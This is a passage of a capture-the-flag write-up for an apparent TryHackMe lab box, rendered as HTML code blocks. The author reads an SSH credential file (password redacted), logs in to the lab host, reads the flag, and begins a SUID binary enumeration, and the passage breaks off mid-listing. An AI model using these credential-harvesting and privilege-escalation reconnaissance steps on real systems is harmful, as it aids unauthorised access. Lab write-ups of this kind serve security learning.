&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-rw-rw-r-- &lt;span class="m">1&lt;/span> zeamkish zeamkish &lt;span class="m">5&lt;/span> Jul &lt;span class="m">6&lt;/span> &lt;span class="m">2023&lt;/span> .bash_history
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-rw-r--r-- &lt;span class="m">1&lt;/span> zeamkish zeamkish &lt;span class="m">220&lt;/span> Jun &lt;span class="m">8&lt;/span> &lt;span class="m">2023&lt;/span> .bash_logout
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-rw-r--r-- &lt;span class="m">1&lt;/span> zeamkish zeamkish &lt;span class="m">3771&lt;/span> Jun &lt;span class="m">8&lt;/span> &lt;span class="m">2023&lt;/span> .bashrc
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">drwx------ &lt;span class="m">2&lt;/span> zeamkish zeamkish &lt;span class="m">4096&lt;/span> Jun &lt;span class="m">8&lt;/span> &lt;span class="m">2023&lt;/span> .cache
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-rw-r--r-- &lt;span class="m">1&lt;/span> zeamkish zeamkish &lt;span class="m">807&lt;/span> Jun &lt;span class="m">8&lt;/span> &lt;span class="m">2023&lt;/span> .profile
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-rw-r----- &lt;span class="m">1&lt;/span> zeamkish zeamkish &lt;span class="m">27&lt;/span> Jun &lt;span class="m">8&lt;/span> &lt;span class="m">2023&lt;/span> flag.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-rw-rw-r-- &lt;span class="m">1&lt;/span> root zeamkish &lt;span class="m">34&lt;/span> Jun &lt;span class="m">11&lt;/span> &lt;span class="m">2023&lt;/span> ssh_creds.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ cat ssh_creds.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat ssh_creds.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SSH CREDS
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">zeamkish
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;redacted&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>So now we are in as zeamkish and we can read the flag:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ssh zeamkish@10.10.229.207
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">zeamkish@10.10.229.207&lt;span class="err">&amp;#39;&lt;/span>s password:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Welcome to Ubuntu 20.04.6 LTS &lt;span class="o">(&lt;/span>GNU/Linux 5.15.0-1039-aws x86_64&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Documentation: https://help.ubuntu.com
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Management: https://landscape.canonical.com
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Support: https://ubuntu.com/advantage
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> System information as of Sun Jan &lt;span class="m">28&lt;/span> 14:48:35 UTC &lt;span class="m">2024&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> System load: 0.0 Processes: &lt;span class="m">130&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Usage of /: 7.5% of 58.09GB Users logged in: &lt;span class="m">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Memory usage: 21% IPv4 address &lt;span class="k">for&lt;/span> eth0: 10.10.229.207
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Swap usage: 0%
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Ubuntu Pro delivers the most comprehensive open &lt;span class="nb">source&lt;/span> security and
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> compliance features.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> https://ubuntu.com/aws/pro
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Expanded Security Maintenance &lt;span class="k">for&lt;/span> Applications is not enabled.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">0&lt;/span> updates can be applied immediately.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Enable ESM Apps to receive additional future security updates.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">See https://ubuntu.com/esm or run: sudo pro status
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The list of available updates is more than a week old.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">To check &lt;span class="k">for&lt;/span> new updates run: sudo apt update
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Last login: Sun Jul &lt;span class="m">2&lt;/span> 17:27:46 &lt;span class="m">2023&lt;/span> from 10.10.83.109
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">zeamkish@ip-10-10-229-207:~$ whoami
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">zeamkish
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">zeamkish@ip-10-10-229-207:~$ ls
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">flag.txt ssh_creds.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">zeamkish@ip-10-10-229-207:~$ cat flag.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">THM&lt;span class="o">{&lt;/span>&amp;lt;redacted&amp;gt;&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>After some enumeration I found a SUID set:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;span class="lnt">54
&lt;/span>&lt;span class="lnt">55
&lt;/span>&lt;span class="lnt">56
&lt;/span>&lt;span class="lnt">57
&lt;/span>&lt;span class="lnt">58
&lt;/span>&lt;span class="lnt">59
&lt;/span>&lt;span class="lnt">60
&lt;/span>&lt;span class="lnt">61
&lt;/span>&lt;span class="lnt">62
&lt;/span>&lt;span class="lnt">63
&lt;/span>&lt;span class="lnt">64
&lt;/span>&lt;span class="lnt">65
&lt;/span>&lt;span class="lnt">66
&lt;/span>&lt;span class="lnt">67
&lt;/span>&lt;span class="lnt">68
&lt;/span>&lt;span class="lnt">69
&lt;/span>&lt;span class="lnt">70
&lt;/span>&lt;span class="lnt">71
&lt;/span>&lt;span class="lnt">72
&lt;/span>&lt;span class="lnt">73
&lt;/span>&lt;span class="lnt">74
&lt;/span>&lt;span class="lnt">75
&lt;/span>&lt;span class="lnt">76
&lt;/span>&lt;span class="lnt">77
&lt;/span>&lt;span class="lnt">78
&lt;/span>&lt;span class="lnt">79
&lt;/span>&lt;span class="lnt">80
&lt;/span>&lt;span class="lnt">81
&lt;/span>&lt;span class="lnt">82
&lt;/span>&lt;span class="lnt">83
&lt;/span>&lt;span class="lnt">84
&lt;/span>&lt;span class="lnt">85
&lt;/span>&lt;span class="lnt">86
&lt;/span>&lt;span class="lnt">87
&lt;/span>&lt;span class="lnt">88
&lt;/span>&lt;span class="lnt">89
&lt;/span>&lt;span class="lnt">90
&lt;/span>&lt;span class="lnt">91
&lt;/span>&lt;span class="lnt">92
&lt;/span>&lt;span class="lnt">93
&lt;/span>&lt;span class="lnt">94
&lt;/span>&lt;span class="lnt">95
&lt;/span>&lt;span class="lnt">96
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">zeamkish@ip-10-10-229-207:/home/ubuntu/sqlmap$ find / -type f -perm -04000 -ls 2&amp;gt;/dev/null
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">847&lt;/span> &lt;span class="m">84&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">85064&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core20/1974/usr/bin/chfn
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">853&lt;/span> &lt;span class="m">52&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">53040&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core20/1974/usr/bin/chsh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">922&lt;/span> &lt;span class="m">87&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">88464&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core20/1974/usr/bin/gpasswd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1006&lt;/span> &lt;span class="m">55&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">55528&lt;/span> May &lt;span class="m">30&lt;/span> &lt;span class="m">2023&lt;/span> /snap/core20/1974/usr/bin/mount
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1015&lt;/span> &lt;span class="m">44&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">44784&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core20/1974/usr/bin/newgrp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1030&lt;/span> &lt;span class="m">67&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">68208&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core20/1974/usr/bin/passwd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1140&lt;/span> &lt;span class="m">67&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">67816&lt;/span> May &lt;span class="m">30&lt;/span> &lt;span class="m">2023&lt;/span> /snap/core20/1974/usr/bin/su
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1141&lt;/span> &lt;span class="m">163&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">166056&lt;/span> Apr &lt;span class="m">4&lt;/span> &lt;span class="m">2023&lt;/span> /snap/core20/1974/usr/bin/sudo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1199&lt;/span> &lt;span class="m">39&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">39144&lt;/span> May &lt;span class="m">30&lt;/span> &lt;span class="m">2023&lt;/span> /snap/core20/1974/usr/bin/umount
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1288&lt;/span> &lt;span class="m">51&lt;/span> -rwsr-xr-- &lt;span class="m">1&lt;/span> root systemd-resolve &lt;span class="m">51344&lt;/span> Oct &lt;span class="m">25&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1660&lt;/span> &lt;span class="m">463&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">473576&lt;/span> Apr &lt;span class="m">3&lt;/span> &lt;span class="m">2023&lt;/span> /snap/core20/1974/usr/lib/openssh/ssh-keysign
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">847&lt;/span> &lt;span class="m">84&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">85064&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core20/1950/usr/bin/chfn
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">853&lt;/span> &lt;span class="m">52&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">53040&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core20/1950/usr/bin/chsh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">922&lt;/span> &lt;span class="m">87&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">88464&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core20/1950/usr/bin/gpasswd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1006&lt;/span> &lt;span class="m">55&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">55528&lt;/span> May &lt;span class="m">30&lt;/span> &lt;span class="m">2023&lt;/span> /snap/core20/1950/usr/bin/mount
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1015&lt;/span> &lt;span class="m">44&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">44784&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core20/1950/usr/bin/newgrp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1030&lt;/span> &lt;span class="m">67&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">68208&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core20/1950/usr/bin/passwd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1140&lt;/span> &lt;span class="m">67&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">67816&lt;/span> May &lt;span class="m">30&lt;/span> &lt;span class="m">2023&lt;/span> /snap/core20/1950/usr/bin/su
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1141&lt;/span> &lt;span class="m">163&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">166056&lt;/span> Apr &lt;span class="m">4&lt;/span> &lt;span class="m">2023&lt;/span> /snap/core20/1950/usr/bin/sudo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1199&lt;/span> &lt;span class="m">39&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">39144&lt;/span> May &lt;span class="m">30&lt;/span> &lt;span class="m">2023&lt;/span> /snap/core20/1950/usr/bin/umount
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1288&lt;/span> &lt;span class="m">51&lt;/span> -rwsr-xr-- &lt;span class="m">1&lt;/span> root systemd-resolve &lt;span class="m">51344&lt;/span> Oct &lt;span class="m">25&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core20/1950/usr/lib/dbus-1.0/dbus-daemon-launch-helper
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1660&lt;/span> &lt;span class="m">463&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">473576&lt;/span> Apr &lt;span class="m">3&lt;/span> &lt;span class="m">2023&lt;/span> /snap/core20/1950/usr/lib/openssh/ssh-keysign
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">66&lt;/span> &lt;span class="m">40&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">40152&lt;/span> Jun &lt;span class="m">14&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core/15511/bin/mount
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">80&lt;/span> &lt;span class="m">44&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">44168&lt;/span> May &lt;span class="m">7&lt;/span> &lt;span class="m">2014&lt;/span> /snap/core/15511/bin/ping
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">81&lt;/span> &lt;span class="m">44&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">44680&lt;/span> May &lt;span class="m">7&lt;/span> &lt;span class="m">2014&lt;/span> /snap/core/15511/bin/ping6
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">98&lt;/span> &lt;span class="m">40&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">40128&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core/15511/bin/su
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">116&lt;/span> &lt;span class="m">27&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">27608&lt;/span> Jun &lt;span class="m">14&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core/15511/bin/umount
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2646&lt;/span> &lt;span class="m">71&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">71824&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core/15511/usr/bin/chfn
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2648&lt;/span> &lt;span class="m">40&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">40432&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core/15511/usr/bin/chsh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2725&lt;/span> &lt;span class="m">74&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">75304&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core/15511/usr/bin/gpasswd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2817&lt;/span> &lt;span class="m">39&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">39904&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core/15511/usr/bin/newgrp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2830&lt;/span> &lt;span class="m">53&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">54256&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core/15511/usr/bin/passwd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2940&lt;/span> &lt;span class="m">134&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">136808&lt;/span> Jan &lt;span class="m">17&lt;/span> &lt;span class="m">2023&lt;/span> /snap/core/15511/usr/bin/sudo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">3039&lt;/span> &lt;span class="m">42&lt;/span> -rwsr-xr-- &lt;span class="m">1&lt;/span> root systemd-resolve &lt;span class="m">42992&lt;/span> Oct &lt;span class="m">26&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core/15511/usr/lib/dbus-1.0/dbus-daemon-launch-helper
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">3411&lt;/span> &lt;span class="m">419&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">428240&lt;/span> Oct &lt;span class="m">7&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core/15511/usr/lib/openssh/ssh-keysign
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">6485&lt;/span> &lt;span class="m">125&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">127656&lt;/span> May &lt;span class="m">27&lt;/span> &lt;span class="m">2023&lt;/span> /snap/core/15511/usr/lib/snapd/snap-confine
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">7673&lt;/span> &lt;span class="m">386&lt;/span> -rwsr-xr-- &lt;span class="m">1&lt;/span> root dip &lt;span class="m">394984&lt;/span> Jul &lt;span class="m">23&lt;/span> &lt;span class="m">2020&lt;/span> /snap/core/15511/usr/sbin/pppd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">66&lt;/span> &lt;span class="m">40&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">40152&lt;/span> Jun &lt;span class="m">14&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core/15419/bin/mount
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">80&lt;/span> &lt;span class="m">44&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">44168&lt;/span> May &lt;span class="m">7&lt;/span> &lt;span class="m">2014&lt;/span> /snap/core/15419/bin/ping
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">81&lt;/span> &lt;span class="m">44&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">44680&lt;/span> May &lt;span class="m">7&lt;/span> &lt;span class="m">2014&lt;/span> /snap/core/15419/bin/ping6
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">98&lt;/span> &lt;span class="m">40&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">40128&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core/15419/bin/su
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">116&lt;/span> &lt;span class="m">27&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">27608&lt;/span> Jun &lt;span class="m">14&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core/15419/bin/umount
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2607&lt;/span> &lt;span class="m">71&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">71824&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core/15419/usr/bin/chfn
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2609&lt;/span> &lt;span class="m">40&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">40432&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core/15419/usr/bin/chsh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2686&lt;/span> &lt;span class="m">74&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">75304&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core/15419/usr/bin/gpasswd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2778&lt;/span> &lt;span class="m">39&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">39904&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core/15419/usr/bin/newgrp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2791&lt;/span> &lt;span class="m">53&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">54256&lt;/span> Nov &lt;span class="m">29&lt;/span> &lt;span class="m">2022&lt;/span> /snap/core/15419/usr/bin/passwd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2901&lt;/span> &lt;span class="m">134&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">136808&lt;/span> Jan &lt;span class="m">17&lt;/span> &lt;span class="m">2023&lt;/span> /snap/core/15419/usr/bin/sudo
